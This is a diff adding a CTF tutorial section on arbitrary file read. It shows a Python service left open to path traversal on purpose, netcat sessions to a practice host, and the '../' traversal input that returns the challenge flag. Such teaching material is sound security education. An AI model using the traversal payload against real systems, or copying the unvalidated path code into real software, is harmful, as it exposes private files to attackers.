@@ -1451,7 +1451,123 @@ elliot@ctf101-shell:~/ctf101$
 
 ### Arbitrary File Read
 
+Arbitrary file reads allow you to read from any location that the owner of the
+service has access to. Take a look at this vulnerable service:
 
+```python
+#!/usr/bin/python
+# I might have left a little present at /flag
+
+import sys
+
+def write(data, term="\n"):
+    sys.stdout.write(data + term)
+    sys.stdout.flush()
+
+def main():
+    # Tell the user what we have
+    write("Our selection: futurama, ghost, pinkfloyd, rat")
+    write("Take your pick: ", term="")
+
+    # What did they pick
+    pick = sys.stdin.readline().strip()
+
+    # Try reading the art
+    try:
+        location = "/home/arbitraryread/art/" + pick
+        contents = open(location).read()
+    except:
+        write("Unable to read the art from file...")
+        exit()
+
+    # Give them the art
+    write(contents)
+
+if __name__ == "__main__":
+    main()
+```
+
+The service is running at `nc pwn.spro.ink 1339`. Let's try interacting with it:
+
+```bash
+elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1339
+Our selection: futurama, ghost, pinkfloyd, rat
+Take your pick: pinkfloyd
+
+
+                        ..uu.
+                       ?$""`?i           z'
+                       `M  .@"          x"
+                       'Z :#"  .   .    f 8M
+                       '&H?`  :$f U8   <  MP   x#'
+                       d#`    XM  $5.  $  M' xM"
+                     .!">     @  'f`$L:M  R.@!`
+                    +`  >     R  X  "NXF  R"*L
+                        k    'f  M   "$$ :E  5.
+                        %    `~  "    `  'K  'M
+                            .uH          'E   `h
+                         .x*`             X     `
+                      .uf`                *
+                    .@8     .
+                   'E9F  uf"          ,     ,
+                     9h+"   $M    eH. 8b. .8    .....
+                    .8`     $'   M 'E  `R;'   d?"""`"#
+                   ` E      @    b  d   9R    ?*     @
+                     >      K.zM `%M'   9'    Xf   .f
+                    ;       R'          9     M  .=`
+                    t                   M     Mx~
+                    @                  lR    z"
+                    @                  `   ;"
+                                          `
+                                 .u!"`
+                             .x*"`
+                         ..+"NP
+                      .z""   ?
+                    M#`      9     ,     ,
+                             9 M  d! ,8P'
+                             R X.:x' R'  ,
+                             F F' M  R.d'
+                             d P  @  E`  ,
+                            P  '  P  N.d'
+                           ''        '
+                ss
+                 X               x             .
+                 9     .f       !         .    $b
+                 4;    $k      /         dH    $f
+                 'X   ;$$     z  .       MR   :$
+                  R   M$$,   :  d9b      M'   tM
+                  M:  #'$L  ;' M `8      X    MR
+                  `$;t' $F  # X ,oR      t    Q;
+                   $$@  R$ H :RP' $b     X    @'
+                   9$E  @Bd' $'   ?X     ;    W
+                   `M'  `$M d$    `E    ;.o* :R   ..
+                    `    '  "'     '    @'   '$o*"'  -Philippe Chaintreuil
+
+elliot@ctf101-shell:~/ctf101$
+```
+
+Basically, what it does is ask the user for a name to a file containing some
+ascii art and displays the contents of the file to the user if the script is
+able to retrieve it. The vulnerability exists on the following line since there
+is no input validation to determine whether the filename the user provides is
+legitimate or not.
+
+```python
+        location = "/home/arbitraryread/art/" + pick
+        contents = open(location).read()
+```
+
+We can read the flag file at `/flag` by traversing upwards in the directory path
+using `..` to get to root:
+
+```bash
+elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1339
+Our selection: futurama, ghost, pinkfloyd, rat
+Take your pick: ../../../../../../flag
+ctf101{M3x1c4n_wr3stl3r_by_4dd13}
+
+elliot@ctf101-shell:~/ctf101$
+```
 
 ### Arbitrary File Write
 
